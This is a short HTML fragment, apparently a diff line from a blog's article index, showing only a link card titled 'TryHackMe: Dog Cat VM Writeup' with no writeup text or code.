+            <h2 class="article-title">TryHackMe: Dog Cat VM Writeup</h2>
         </div>
     </a>
 </article>
